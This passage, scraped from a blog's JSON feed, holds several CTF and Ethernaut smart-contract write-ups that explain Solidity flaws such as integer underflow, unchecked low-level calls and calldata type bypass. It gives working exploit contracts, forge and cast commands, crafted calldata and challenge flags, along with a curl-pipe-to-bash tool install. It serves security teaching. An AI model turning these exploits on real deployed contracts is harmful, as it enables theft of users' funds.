claimStartingBonus() public _onlyOnePerEmployee{ 2 balanceOf[owner] -= 1e18; 3 balanceOf[msg.sender] += 1e18; 4} The first way is by calling claimStartingBonus(). When we call claimStartingBonus(), it will execute the _onlyOnePerEmployee() modifier. The modifier has a check: require(hasTakeBonus[msg.sender] == false, \u0026quot;Bonus can only be taken once!\u0026quot;);, but since hasTakeBonus[msg.sender] is not updated in the claimStartingBonus() function, we will be able to call the function 25 times, as the owner has only 25 ether. However, we actually need only 6 ether to become an executive.\n1function buyCredit() public payable _onlyEmployee{ 2 require(msg.value \u0026gt;= 1 ether, \u0026#34;Minimum is 1 Ether\u0026#34;); 3 uint256 totalBought = msg.value; 4 balanceOf[msg.sender] += totalBought; 5 totalSupply += totalBought; 6} The second way is by calling buyCredit() function after becoming an employee. In the instance, they have given 7 ether as our wallet balance. So we can directly send 6 ether while calling the buyCredit() function, and it will set our balance to 6 ether.\nLet\u0026rsquo;s recall all the steps involved to exploit:\nBelow are the Exploit scripts:\nScript 1: Using claimStartingBonus() Get a balance of at least 6 ether by calling claimStartingBonus() multiple times. Become an employee by calling becomeEmployee(). Become a manager by calling becomeManager(). Become an executive by calling becomeExecutive(). Call the transfer function by passing the address of the Crain contract as to, call data to invoke ascendToCrain() as _message, and value as 0. The value should be zero because ascendToCrain() is a non-payable function. Call isSolved() and verify. Script 2: Using buyCredit() Become an employee by calling becomeEmployee(). Get a balance of 6 ether by calling buyCredit() and sending 6 ether. Become a manager by calling becomeManager(). Become an executive by calling becomeExecutive(). Call the transfer function by passing the address of the Crain contract as to, call data to invoke ascendToCrain() as _message, and value as 0. The value should be zero because ascendToCrain() is a non-payable function. Call isSolved() and verify. Below are the Exploit scripts\n1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.0; 3 4import {Script} from \u0026#34;forge-std/Script.sol\u0026#34;; 5import {Setup} from \u0026#34;src/contracts/Setup.sol\u0026#34;; 6 7contract ExploitExecutive is Script { 8 Setup public setup; 9 10 function run() public { 11 vm.startBroadcast(); 12 setup = Setup(0xD3AC2f52E7dCCe686BA20aD048079e094A047CEf); 13 for (uint256 i = 0; i \u0026lt; 6; i++) { 14 setup.cexe().claimStartingBonus(); 15 } 16 setup.cexe().becomeEmployee(); 17 setup.cexe().becomeManager(); 18 setup.cexe().becomeExecutive(); 19 bytes memory data = abi.encodeWithSignature(\u0026#34;ascendToCrain(address)\u0026#34;, address(this)); 20 setup.cexe().transfer(address(setup.crain()), 0, data); 21 vm.stopBroadcast(); 22 } 23} 1$ forge script script/ExploitExecutive.s.sol:ExploitExecutive1 --rpc-url http://ctf.tcp1p.team:44455/01921e42-61fb-498e-8533-12498c9f96b2 --broadcast -i 1 1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.0; 3 4import {Script} from \u0026#34;forge-std/Script.sol\u0026#34;; 5import {Setup} from \u0026#34;src/contracts/Setup.sol\u0026#34;; 6 7contract ExploitExecutive is Script { 8 Setup public setup; 9 10 function run() public { 11 vm.startBroadcast(); 12 setup = Setup(//YOUR__SETUP__ADDR); 13 setup.cexe().becomeEmployee(); 14 setup.cexe().buyCredit{value: 6 ether}(); 15 setup.cexe().becomeManager(); 16 setup.cexe().becomeExecutive(); 17 bytes memory data = abi.encodeWithSignature(\u0026#34;ascendToCrain(address)\u0026#34;, address(this)); 18 setup.cexe().transfer(address(setup.crain()), 0, data); 19 vm.stopBroadcast(); 20 } 21} 1$ forge script script/ExploitExecutive.s.sol:ExploitExecutive2 --rpc-url http://ctf.tcp1p.team:44455/01921e42-61fb-498e-8533-12498c9f96b2 --broadcast -i 1 Any of the above two scripts will work; you can use either one. The only difference between the two scripts is how we get the ether. I hope you This writeup is helpful.\nFlag: TCP1P{Imagine_getting_kicked_out_like_that_by_s0m3_3Xecu7iVE}\n***Hope you enjoyed this write-up. Keep on hacking and learning!***\n","date":"October 23, 2024","img":"","lang":"en","langName":"","largeImg":"","permalink":"/blogs/tcp1p-2024/executive-problem/","series":[{"title":"TCP1P-2024","url":"/series/tcp1p-2024/"}],"smallImg":"","tags":[],"timestamp":1729627242,"title":"Executive Problem"},{"authors":[],"categories":[{"title":"Blockchain","url":"/categories/blockchain/"}],"content":" Writeup for BABY ERC-20 Hello h4ck3r, welcome to the world of smart contract hacking. In order to understand this writeup you need to understand foundry. Challenge Description No Description given\nKey Concepts to Learn In order to solve this challenge we need to understand overflows and underflows in solidity.\n1// SPDX-License-Identifier: MIT 2pragma solidity ^0.6.0; 3 4contract overflow_underflow{ 5 uint8 overflow=255; 6 uint8 underflow=0; 7 8 function increment()public{ 9 overflow++; 10 } 11 12 function decrement()public{ 13 underflow--; 14 } 15 16} The above contract is a good example to understand overflows and underflows. The state variable overflow is set to 255, and the state variable underflow is set to 0.\nuint8 technically refers to 8 bits, which means it can store a maximum value of 255. If we increase the value of the variable after 255, it will start from zero again. In the above contract, if we call increment() once, then overflow will be set to zero. If we call it again, it will be set to 1, and so on.\nThe minimum value of uint8 is 0. But if we decrease a uint8 variable after zero, it will become 255. In the above contract, if we call decrement() once, then underflow is set to 255. If we call it again, underflow will be set to 254, and so on.\nFor solidity versions greater than 0.8.0, overflow and underflows are implicitly handled. But for solidity versions less than 0.8.0, we need to explicitly handle the overflows and underflows.There is a library named SafeMath to handle overflows and underflows for versions less than 0.8.0.\nIf you are new to overflows and underflows, I suggest you go to Remix and try out the example by deploying in remix local VM\u0026rsquo;s.\nExploit The below are the source contracts.\nSetup contract 1// SPDX-License-Identifier: MIT 2pragma solidity 0.6.12; 3 4import {HCOIN} from \u0026#34;./HCOIN.sol\u0026#34;; 5 6contract Setup { 7 HCOIN public coin; 8 address player; 9 10 constructor() public payable { 11 require(msg.value == 1 ether); 12 coin = new HCOIN(); 13 coin.deposit{value: 1 ether}(); 14 } 15 16 function setPlayer(address _player) public { 17 require(_player == msg.sender, \u0026#34;Player must be the same with the sender\u0026#34;); 18 require(_player == tx.origin, \u0026#34;Player must be a valid Wallet/EOA\u0026#34;); 19 player = _player; 20 } 21 22 function isSolved() public view returns (bool) { 23 return coin.balanceOf(player) \u0026gt; 1000 ether; // im rich :D 24 } 25} HCOIN contract 1// SPDX-License-Identifier: MIT 2pragma solidity 0.6.12; 3 4import \u0026#34;./Ownable.sol\u0026#34;; 5 6contract HCOIN is Ownable { 7 string public constant name = \u0026#34;HackerikaCoin\u0026#34;; 8 string public constant symbol = \u0026#34;HCOIN\u0026#34;; 9 uint8 public constant decimals = 18; 10 11 mapping(address =\u0026gt; uint256) public balanceOf; 12 mapping(address =\u0026gt; mapping(address =\u0026gt; uint256)) public allowance; 13 14 event Transfer(address indexed from, address indexed to, uint256 value); 15 event Approval(address indexed owner, address indexed spender, uint256 value); 16 event Deposit(address indexed to, uint256 value); 17 18 function deposit() public payable { 19 balanceOf[msg.sender] += msg.value; 20 emit Deposit(msg.sender, msg.value); 21 } 22 23 function transfer(address _to, uint256 _value) public returns (bool success) { 24 require(_to != address(0), \u0026#34;ERC20: transfer to the zero address\u0026#34;); 25 require(balanceOf[msg.sender] - _value \u0026gt;= 0, \u0026#34;Insufficient Balance\u0026#34;); 26 balanceOf[msg.sender] -= _value; 27 balanceOf[_to] += _value; 28 emit Transfer(msg.sender, _to, _value); 29 return true; 30 } 31 32 function approve(address _spender, uint256 _value) public returns (bool success) { 33 allowance[msg.sender][_spender] = _value; 34 emit Approval(msg.sender, _spender, _value); 35 return true; 36 } 37 38 function transferFrom(address _from, address _to, uint256 _value) public onlyOwner returns (bool success) { 39 require(allowance[_from][msg.sender] \u0026gt;= _value, \u0026#34;Allowance exceeded\u0026#34;); 40 require(_to != address(0), \u0026#34;ERC20: transfer to the zero address\u0026#34;); 41 require(balanceOf[msg.sender] - _value \u0026gt;= 0, \u0026#34;Insufficient Balance\u0026#34;); 42 balanceOf[_from] -= _value; 43 balanceOf[_to] += _value; 44 allowance[_from][msg.sender] -= _value; 45 emit Transfer(_from, _to, _value); 46 return true; 47 } 48 49 fallback() external payable { 50 deposit(); 51 } 52} Ownable contract 1// SPDX-License-Identifier: MIT 2pragma solidity ^0.6.0; 3 4/** 5 * @dev Provides basic authorization control functions. This simplifies 6 * the implementation of \u0026#34;user permissions\u0026#34;. 7 */ 8contract Ownable { 9 address private _owner; 10 11 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); 12 13 /** 14 * @dev The Ownable constructor sets the original `owner` of the contract to the sender 15 * account. 16 */ 17 constructor() internal { 18 _owner = msg.sender; 19 emit OwnershipTransferred(address(0), _owner); 20 } 21 22 /** 23 * @dev Returns the address of the current owner. 24 */ 25 function owner() public view returns (address) { 26 return _owner; 27 } 28 29 /** 30 * @dev Throws if called by any account other than the owner. 31 */ 32 modifier onlyOwner() { 33 require(_owner == msg.sender, \u0026#34;Ownable: caller is not the owner\u0026#34;); 34 _; 35 } 36 37 /** 38 * @dev Allows the current owner to transfer control of the contract to a newOwner. 39 * @param newOwner The address to transfer ownership to. 40 */ 41 function transferOwnership(address newOwner) public virtual onlyOwner { 42 require(newOwner != address(0), \u0026#34;Ownable: new owner is the zero address\u0026#34;); 43 emit OwnershipTransferred(_owner, newOwner); 44 _owner = newOwner; 45 } 46} In this challenge our task is make isSolved() function return true.\n1function isSolved() public view returns (bool) { 2 return coin.balanceOf(player) \u0026gt; 1000 ether; // im rich :D 3 } The function isSolved() is checking if the player has enough balance in the HCOIN contract or not. If the player\u0026rsquo;s balance is more than 1000 ether, it will return true.\nNow let\u0026rsquo;s understand some functions in the HCOIN contract. The blanceOf variable is changed in three functions.\n1function deposit() public payable { 2 balanceOf[msg.sender] += msg.value; 3 emit Deposit(msg.sender, msg.value); 4} The function deposit() will increment the balanceOf of msg.sender (caller) by msg.value (if any ether is sent during the call). We can call this function and make our balance 1001 ether HCOIN tokens only if we have 1001 ETH. Since the challenge creator has given us less than 1001 ether, we need to look into other functions.\n1function transfer(address _to, uint256 _value) public returns (bool success) { 2 require(_to != address(0), \u0026#34;ERC20: transfer to the zero address\u0026#34;); 3 require(balanceOf[msg.sender] - _value \u0026gt;= 0, \u0026#34;Insufficient Balance\u0026#34;); 4 balanceOf[msg.sender] -= _value; 5 balanceOf[_to] += _value; 6 emit Transfer(msg.sender, _to, _value); 7 return true; 8} The function transfer() takes two arguments: address _to and uint256 _value. It first checks if _to is a zero address. If it is, the function call will revert. Otherwise, it checks if msg.sender has enough balance to transfer the specified amount. If msg.sender has enough balance, the function decreases the msg.sender balance by _value and increases the _to balance by _value.\nThe Solidity compiler version used for the HCOIN contract is 0.6.12, which means it is vulnerable to overflows and underflows. They also haven\u0026rsquo;t used the SafeMath library to prevent overflows. So, the contract is vulnerable to overflows and underflows.\nLet\u0026rsquo;s check how this function will work if the balance of msg.sender is 0 and they are transferring 1 wei to another address.\nbalanceOf[msg.sender] will return 0 and _value is 1. 0 - 1 will return 2**256 - 1 which is greater than 0. balanceOf[msg.sender] -= _value. This will set msg.sender balance to 2**256 - 1 wei which is equivalent to 115792089237316195423570985008687907853269984665640564039457.584007913129639935 ether. balanceOf[_to] += _value. This will set _to balance to 1 wei. So from our account if we send 1 wei to any address then we will have a balance of 115792089237316195423570985008687907853269984665640564039457.584007913129639935 ether HCOIN tokens and our challenge will be solved.\n1function setPlayer(address _player) public { 2 require(_player == msg.sender, \u0026#34;Player must be the same with the sender\u0026#34;); 3 require(_player == tx.origin, \u0026#34;Player must be a valid Wallet/EOA\u0026#34;); 4 player = _player; 5} Once the transfer is completed we need call setPlayer() function in Setup.sol by passing our address as an argument.\nWe can complete this transaction in two ways. One way is by making direct transactions using cast, and the second way is by writing a script.\nMethod-1\nIn our instance, they are giving only the Setup contract address, but we need to interact with the HCOIN contract first. Since coin() in Setup is a public variable, we can get the HCOIN contract address by making a call to coin().\n1$ cast call $SETUP_ADDR \u0026#34;coin()\u0026#34; --rpc-url $RPC_URL SETUP_ADDR is the Setup contract address. Now we need to call the transfer() function.\n1$ cast send $HCOIN_ADDR \u0026#34;transfer(address,uint256)\u0026#34; 0xD896A0672D9E650B18524139293e4CDcA1E44c9e 1 --rpc-url $RPC_URL --interactive 0x90bdc08cf595a862268cb0f12ec5956178e6fbf0 is the address of the HCOIN contract.\n1$ cast send $SETUP_ADDR \u0026#34;setPlayer(address)\u0026#34; $PLAYER_ADDR --rpc-url $RPC_URL --interactive Once this transaction completes, the challenge will be solved.\nMethod-2\nWe can also solve this challenge by writing a script.\n1// SPDX-License-Identifier: SEE LICENSE IN LICENSE 2pragma solidity ^0.6.0; 3 4import {Script, console} from \u0026#34;forge-std/Script.sol\u0026#34;; 5import {Setup, HCOIN} from \u0026#34;src/Setup.sol\u0026#34;; 6import {ExploitHCOIN} from \u0026#34;./ExploitHCOIN.sol\u0026#34;; 7 8contract ExploitScript is Script { 9 function run() public { 10 vm.startBroadcast(); 11 Setup setup = Setup(//__YOUR__SETUP__ADDRESS); 12 HCOIN hcoin = setup.coin(); 13 hcoin.transfer(address(1), 1 ether); 14 setup.setPlayer(msg.sender); 15 require(setup.isSolved(), \u0026#34;Exploit Failed\u0026#34;); 16 vm.stopBroadcast(); 17 } 18} 1$ forge script script/ExploitScript.s.sol:ExploitScript --rpc-url $RPC_URL -i 1 --broadcast --sender $PLAYER Once you compile and run the script the challenge will be solved. If you face any copiler version issues set solc_version = \u0026quot;0.6.12\u0026quot; in foundry.toml\nFlag: TCP1P{https://x.com/0xCharlesWang/status/1782350590946799888}\nKey Takeaways For solidity versions less than 0.8.0, we need to explicitly handle the overflows and underflows. We can use the SafeMath library to overcome those.\n***Hope you enjoyed this write-up. Keep on hacking and learning!***\n","date":"October 23, 2024","img":"","lang":"en","langName":"","largeImg":"","permalink":"/blogs/tcp1p-2024/baby-erc-20/","series":[{"title":"TCP1P-2024","url":"/series/tcp1p-2024/"}],"smallImg":"","tags":[{"title":"ERC20","url":"/tags/erc20/"}],"timestamp":1729627140,"title":"Baby ERC 20"},{"authors":[],"categories":[{"title":"Blockchain","url":"/categories/blockchain/"}],"content":" Writeup for Stake Hello h4ck3r, welcome to the world of smart contract hacking. Solving the challenges from Ethernaut will help you understand Solidity better. Each challenge involves deploying a contract and exploiting its vulnerabilities. If you\u0026rsquo;re new to Solidity and haven\u0026rsquo;t deployed a smart contract before, you can learn how to do so using Remix here. Challenge Description Stake is safe for staking native ETH and ERC20 WETH, considering the same 1:1 value of the tokens. Can you drain the contract?\nTo complete this level, the contract state must meet the following conditions:\nThe Stake contract\u0026rsquo;s ETH balance has to be greater than 0. totalStaked must be greater than the Stake contract\u0026rsquo;s ETH balance. You must be a staker. Your staked balance must be 0. Key Concepts to Learn In order to exploit this contract we need to understand how low-level call works\nIn solidity when we use low-level calls the transaction won\u0026rsquo;t fail even if the low-level call fails. It will just return whehter the call is true or false. We need to explicitly write logic to handle edge-cases.\nCheck the below example.\n1 2// SPDX-License-Identifier: MIT 3pragma solidity ^0.8.0; 4 5 6contract contract_one{ 7 mapping(address=\u0026gt;uint256) public balances; 8 9 constructor()payable{ 10 balances[msg.sender]=1000; 11 require(msg.value==1000); 12 } 13 14 15 function withdraw(uint256 amount)public payable{ 16 if(balances[msg.sender]\u0026gt;=amount){ 17 balances[msg.sender]-=amount; 18 (msg.sender).call{value:amount}; 19 } 20 } 21 22 23 function deposit()public payable{ 24 balances[msg.sender]+=msg.value; 25 } 26} 27 28 29contract contract_two{ 30 contract_one public one; 31 32 constructor()payable{ 33 one=new contract_one{value:1000}(); //Creating contract_two 34 } 35 36 function Claim()public{ 37 one.withdraw(1000); 38 } 39 40 function check_balance()public view returns(uint256){ 41 return one.balances(address(this)); 42 } 43} Deploy contract_two by sending 1000 wei during deployment. This will then deploy contract_one by sending 1000 wei, and the constructor in contract_one will set the balance of contract_two to 1000.\nNow, calling the Claim() function in contract_two will call the withdraw() function in contract_one. The withdraw() function in contract_one will reduce the balance of contract_two and send 1000 wei to contract_two using a low-level call.\nSince contract_two does not have a receive() function, it won\u0026rsquo;t accept any ether payments. Therefore, the low-level call made by contract_one will fail, but the balances will still be updated. The next time the Claim() function in contract_two is called, it will revert because the balances have already been updated.\nContract Explaination If you understand the contract, you can move on to the exploit part. If you\u0026rsquo;re a beginner, please read the Contract Explanation to gain a better understanding of Solidity.\n1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.0; 3contract Stake { 4 5 uint256 public totalStaked; 6 mapping(address =\u0026gt; uint256) public UserStake; 7 mapping(address =\u0026gt; bool) public Stakers; 8 address public WETH; 9 10 constructor(address _weth) payable{ 11 totalStaked += msg.value; 12 WETH = _weth; 13 } 14 15 function StakeETH() public payable { 16 require(msg.value \u0026gt; 0.001 ether, \u0026#34;Don\u0026#39;t be cheap\u0026#34;); 17 totalStaked += msg.value; 18 UserStake[msg.sender] += msg.value; 19 Stakers[msg.sender] = true; 20 } 21 function StakeWETH(uint256 amount) public returns (bool){ 22 require(amount \u0026gt; 0.001 ether, \u0026#34;Don\u0026#39;t be cheap\u0026#34;); 23 (,bytes memory allowance) = WETH.call(abi.encodeWithSelector(0xdd62ed3e, msg.sender,address(this))); 24 require(bytesToUint(allowance) \u0026gt;= amount,\u0026#34;How am I moving the funds honey?\u0026#34;); 25 totalStaked += amount; 26 UserStake[msg.sender] += amount; 27 (bool transfered, ) = WETH.call(abi.encodeWithSelector(0x23b872dd, msg.sender,address(this),amount)); 28 Stakers[msg.sender] = true; 29 return transfered; 30 } 31 32 function Unstake(uint256 amount) public returns (bool){ 33 require(UserStake[msg.sender] \u0026gt;= amount,\u0026#34;Don\u0026#39;t be greedy\u0026#34;); 34 UserStake[msg.sender] -= amount; 35 totalStaked -= amount; 36 (bool success, ) = payable(msg.sender).call{value : amount}(\u0026#34;\u0026#34;); 37 return success; 38 } 39 function bytesToUint(bytes memory data) internal pure returns (uint256) { 40 require(data.length \u0026gt;= 32, \u0026#34;Data length must be at least 32 bytes\u0026#34;); 41 uint256 result; 42 assembly { 43 result := mload(add(data, 0x20)) 44 } 45 return result; 46 } 47} The contract has four state variables named totalStake, Userstake, Stakers, and WETH. totalStake is of type uint256, Userstake is a mapping of address to uint256, Stakers is a mapping of address to bool, and WETH is the address of an ERC20 instance.\n1constructor(address _weth) payable{ 2 totalStaked += msg.value; 3 WETH = _weth; 4} The constructor takes an argument of type address, sets WETH to the address passed, and sets totalStaked to msg.value.\n1function StakeETH() public payable { 2 require(msg.value \u0026gt; 0.001 ether, \u0026#34;Don\u0026#39;t be cheap\u0026#34;); 3 totalStaked += msg.value; 4 UserStake[msg.sender] += msg.value; 5 Stakers[msg.sender] = true; 6} The function StakeETH() checks if msg.value is greater than 0.001 ether. If it is, the function increases totalStaked by msg.value, updates UserStake for msg.sender by adding msg.value, and sets Stakers for msg.sender to true.\n1function StakeWETH(uint256 amount) public returns (bool){ 2 require(amount \u0026gt; 0.001 ether, \u0026#34;Don\u0026#39;t be cheap\u0026#34;); 3 (,bytes memory allowance) = WETH.call(abi.encodeWithSelector(0xdd62ed3e, msg.sender,address(this))); 4 require(bytesToUint(allowance) \u0026gt;= amount,\u0026#34;How am I moving the funds honey?\u0026#34;); 5 totalStaked += amount; 6 UserStake[msg.sender] += amount; 7 (bool transfered, ) = WETH.call(abi.encodeWithSelector(0x23b872dd, msg.sender,address(this),amount)); 8 Stakers[msg.sender] = true; 9 return transfered; 10} The function StakeWETH() takes an argument of type uint256 and checks if the amount is greater than 0.001 ether. If it is greater, it checks whether the sender has allowed this contract to transfer WETH tokens on behalf of the sender. If the approved amount is greater than the amount passed, it will update the state variables in the same way as the StakeETH() function but makes an extra call to the transferFrom() function in the WETH contract\n1function Unstake(uint256 amount) public returns (bool){ 2 require(UserStake[msg.sender] \u0026gt;= amount,\u0026#34;Don\u0026#39;t be greedy\u0026#34;); 3 UserStake[msg.sender] -= amount; 4 totalStaked -= amount; 5 (bool success, ) = payable(msg.sender).call{value : amount}(\u0026#34;\u0026#34;); 6 return success; 7 } The Unstake() function takes an argument of type uint256 as input. It checks if the msg.sender (caller) has enough balance to transfer. If they have enough balance, it updates the caller\u0026rsquo;s balance by decreasing UserStake of msg.sender by the amount passed. Then it makes a low-level call to transfer tokens and returns whether the call was successful or not.\n1function bytesToUint(bytes memory data) internal pure returns (uint256) { 2 require(data.length \u0026gt;= 32, \u0026#34;Data length must be at least 32 bytes\u0026#34;); 3 uint256 result; 4 assembly { 5 result := mload(add(data, 0x20)) 6 } 7 return result; 8} The function bytesToUint() takes an argument of type bytes as input. It first checks if the data length is 32 bytes. Then, it loads data from memory at the position data + 0x20 because the position of data only contains the length of the data. The actual data is found in the next slot, which is why 0x20 (32 bytes) is added. The value is then loaded into result and returned.\nExploit Our goal is to satisfy the four conditions given in the challenge description. Let\u0026rsquo;s satisfy the conditions one by one.\nThe first condition is to make the contract\u0026rsquo;s ETH balance greater than zero. This can be achieved by sending some ether to the contract.\nThe second condition is to make totalStaked greater than the Stake contract\u0026rsquo;s ETH balance. This can be achieved by staking some WETH tokens. We can call the StakeWETH() function to stake WETH tokens, but it checks if we have allowed the Stake contract to transfer WETH tokens on our behalf before transferring.\nBefore calling StakeWETH(), we need to call the approve() function in the WETH contract to allow the Stake contract to transfer tokens on our behalf. When we call StakeWETH(), the two require statements will pass. Then, StakeWETH() calls the transferFrom function in the WETH contract, transferring tokens from our address to the Stake contract. However, since we don\u0026rsquo;t have any WETH tokens, the call will fail. Because it is a low-level call, it will return false but still it update\u0026rsquo;s all the state changes, increasing the staked balance of WETH. Once this call cpmpletes then second condition will be satisfied.\nThe third condition is that we must be a staker, which means we need to deposit some ETH from our EOA (Externally Owned Account). This can be achieved by calling the StakeETH() function from the console.\nThe fourth condition is to make our staked balance zero. This means that whatever we deposited in the previous condition, we need to withdraw so that our staked balance becomes zero. This can be achieved by calling the Unstake() function from the console.\nNow, all the conditions can be satisfied by the above steps. Below is the Exploit contract.\n1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.0; 3 4interface IStake{ 5 function StakeETH() external payable ; 6 function StakeWETH(uint256 amount) external returns (bool); 7 function Unstake(uint256 amount) external returns (bool); 8} 9 10interface IWeth{ 11 function approve(address spender, uint256 value) external returns (bool); 12} 13 14contract ExploitStake{ 15 IStake stake; 16 IWeth weth; 17 constructor(address stake_addr,address _weth){ 18 stake=IStake(stake_addr); 19 weth=IWeth(_weth); 20 } 21 22 function Exploit()public payable{ 23 stake.StakeETH{value: 0.0011 ether}(); 24 weth.approve(address(stake), 1 ether); 25 stake.StakeWETH(1 ether); 26 27 28 } 29} Deploy this contract by passing the Stake address and WETH address as arguments to the constructor. Then, call the Exploit() function by sending 0.0011 ether during the call.\nOnce the Exploit() call is done, the first two conditions will be satisfied.\nNow, open the console and enter the following:\n1await contract.StakeETH.sendTransaction({ value: 1100000000000000 }); 1\u0026gt; await contract.Unstake(1100000000000000) Once you successfully complete the above two calls, the challenge will be solved, and you can submit the instance.\nThat\u0026rsquo;s it for this challenge hope you enjoyed this challenge.\n***Hope you enjoyed this write-up. Keep on hacking and learning!***\n","date":"October 23, 2024","img":"","lang":"en","langName":"","largeImg":"","permalink":"/blogs/ethernaut/stake/","series":[{"title":"Ethernaut","url":"/series/ethernaut/"}],"smallImg":"","tags":[{"title":"ERC20","url":"/tags/erc20/"}],"timestamp":1729626791,"title":"Stake"},{"authors":[],"categories":[{"title":"Blockchain","url":"/categories/blockchain/"}],"content":" Writeup for Higher Order Hello h4ck3r, welcome to the world of smart contract hacking. Solving the challenges from Ethernaut will help you understand Solidity better. Each challenge involves deploying a contract and exploiting its vulnerabilities. If you\u0026rsquo;re new to Solidity and haven\u0026rsquo;t deployed a smart contract before, you can learn how to do so using Remix here. Challenge Description Imagine a world where the rules are meant to be broken, and only the cunning and the bold can rise to power. Welcome to the Higher Order, a group shrouded in mystery, where a treasure awaits and a commander rules supreme.\nYour objective is to become the Commander of the Higher Order! Good luck!\nThings that might help:\nSometimes, calldata cannot be trusted. Compilers are constantly evolving into better spaceships. Contract Explaination If you understand the contract, you can move on to the exploit part. If you\u0026rsquo;re a beginner, please read the Contract Explanation to gain a better understanding of Solidity.\n1// SPDX-License-Identifier: MIT 2pragma solidity 0.6.12; 3 4contract HigherOrder { 5 address public commander; 6 7 uint256 public treasury; 8 9 function registerTreasury(uint8) public { 10 assembly { 11 sstore(treasury_slot, calldataload(4)) 12 } 13 } 14 15 function claimLeadership() public { 16 if (treasury \u0026gt; 255) commander = msg.sender; 17 else revert(\u0026#34;Only members of the Higher Order can become Commander\u0026#34;); 18 } 19} This Solidity code defines a contract with two state variables: commander of type address and treasury of type uint256.\n1function registerTreasury(uint8) public { 2 assembly { 3 sstore(treasury_slot, calldataload(4)) 4 } 5} The function registerTreasury() takes an argument of type uint8 as input. It then loads the calldata starting from the 4th byte and assigns it to the treasury variable.\nIt starts from the fourth byte because the 0th byte to the 3rd byte (4 bytes) will be the function selector.\n1function claimLeadership() public { 2 if (treasury \u0026gt; 255) commander = msg.sender; 3 else revert(\u0026#34;Only members of the Higher Order can become Commander\u0026#34;); 4} The function claimLeadership() checks whether the treasury value is greater than 255. If it is greater than 255, it sets the commander to msg.sender.\nIf the treasury value is less than or equal to 255, it reverts with an error message: \u0026ldquo;Only members of the Higher Order can become Commander.\nExploit Our goal is to become the commander. The only way we can become the commander is by setting the treasury value to greater than 255.\n1function registerTreasury(uint8) public { 2 assembly { 3 sstore(treasury_slot, calldataload(4)) 4 } 5} The registerTreasury() fucntion takes an argument of type uint8. The max value of a uint8 is 255. So while calling registerTreasury() we won\u0026rsquo;t be able to pass number more than 2555.\nBut if we make a low-level call then it won\u0026rsquo;t check whether the data passes is a uint8 or not. Once we pass the value more than 255 by making a low-level call the challenge will be solved.\nNow lets construct the calldata.\n1$ cast calldata \u0026#34;registerTreasury(uint8)\u0026#34; 255 It will give us 0x211c85ab00000000000000000000000000000000000000000000000000000000000000ff.\nNow we need make changes in calldata because we have sent argument as 255. We need to send more than 255. So let\u0026rsquo;s add one more f before two f\u0026rsquo;s.\nThe final calldata is 0x211c85ab0000000000000000000000000000000000000000000000000000000000000fff.\nNow lets write our Exploit contract.\n1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.0; 3 4 5contract ExploitHigherOrder{ 6 address HigherOrder; 7 8 constructor(address _addr){ 9 HigherOrder=_addr; 10 } 11 12 function Expoit()public{ 13 bytes memory Calldata=hex\u0026#34;211c85ab0000000000000000000000000000000000000000000000000000000000000fff\u0026#34;; 14 (bool a,)=HigherOrder.call(Calldata); 15 require(a,\u0026#34;Exploit Failed\u0026#34;); 16 } 17} Deploy the Exploit contract and call the Exploit() function. Once the call is done then call the claimLeadership() from console.\n1\u0026gt; await contract.claimLeadership() Once call this function the challenge will be solved. Now you can submit the instance.\nThat\u0026rsquo;s it for this challenge hope you enjoyed this challenge.\nKey takeaways We should be careful while using assembly because we need to handle all the edge cases for whatever logic we write in assembly. Instead of assembly, if we use Solidity, it will perform all checks and ensure that the treasury value will always be less than or equal to 255.\nHowever, the Solidity compiler version greater than 0.8.0 doesn\u0026rsquo;t have this exploit.\n***Hope you enjoyed this write-up. Keep on hacking and learning!***\n","date":"October 23, 2024","img":"","lang":"en","langName":"","largeImg":"","permalink":"/blogs/ethernaut/higherorder/","series":[{"title":"Ethernaut","url":"/series/ethernaut/"}],"smallImg":"","tags":[{"title":"Calldata Manipulation","url":"/tags/calldata-manipulation/"}],"timestamp":1729626741,"title":"HigherOrder"},{"authors":[],"categories":[{"title":"Blockchain","url":"/categories/blockchain/"}],"content":" Writeup for Switch Hello h4ck3r, welcome to the world of smart contract hacking. Solving the challenges from Ethernaut will help you understand Solidity better. Each challenge involves deploying a contract and exploiting its vulnerabilities. If you\u0026rsquo;re new to Solidity and haven\u0026rsquo;t deployed a smart contract before, you can learn how to do so using Remix here. Challenge Description Just have to flip the switch. Can\u0026rsquo;t be that hard, right?\nThings that might help:\nUnderstanding how CALLDATA is encoded. Key Concepts To Learn lets learn some low-level inbuilt functions in solidity.\nIn smart contracts, whenever you call a function in another contract, you send some data to that contract. The contract then runs some opcodes to check whether the data sent includes a function selector. In general we write our contracts in Solidity which is a high-level language for writing smart contracts then solidity compiler will convert the code we have written into opcodes then it compiles into bytecode and the bytecode will be published on blockchain when we deploy our contract.\nIf we observe the bytecode we can find that it is a large hex text with each byte represent a opcode and each opcode will run a low-level predefined function.\nThe functions CALLDATASIZE, CALLDATALOAD, CALLDATACOPY are such low-level functions.\nCALLDATASIZE: This opcode returns the length of the calldata.\nExample: If you call a function in a contract and the function does not accept any arguments, the calldata will consist only of the function selector. In this case, CALLDATASIZE will return 4, as the function selector is 4 bytes long. CALLDATALOAD(start_byte): This opcode pushes 32 bytes of transaction data onto the stack, starting from start_byte.\nExample: If you call a function in a contract that accepts two arguments of type uint256 and uint256, CALLDATALOAD will push the function selector and the first 28 bytes of the first argument onto the stack. CALLDATACOPY(mem_pos, start_byte, size): This opcode will copy size number of bytes starting from start_byte to the memory at position mem_pos.\nExample: If you assign a value sent in a function call to an array at index i, the function will copy the calldata to the array at index i. Check the below example to understand the calldatacopy in depth\n1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.0; 3 4contract contract_one{ 5 6 function hello(uint256 _num) public pure returns (uint256) { 7 uint256 num; 8 assembly { 9 let ptr := mload(0x40) 10 calldatacopy(ptr, 4, 32) 11 num := mload(ptr) 12 } 13 return num; 14 } 15} In the hello() function written in assembly, the ptr variable is used to load the free memory pointer. The free memory pointer refers to the unused space in memory that can be utilized to store data.\nNow I will explain how functions in contracts are called when you invoke a function. Basically, I will explain how ABI encoding works.\nBefore staring with abi encoding i want you guys to install foundry so that whatever i explain you can try out. If you have foundry setup that\u0026rsquo;s fine else enter the following commands to download it.\n1mkdir foundry 2cd foundry 3curl -L https://foundry.paradigm.xyz | bash 4source ~/.bashrc 5foundryup Now enter the follwing to 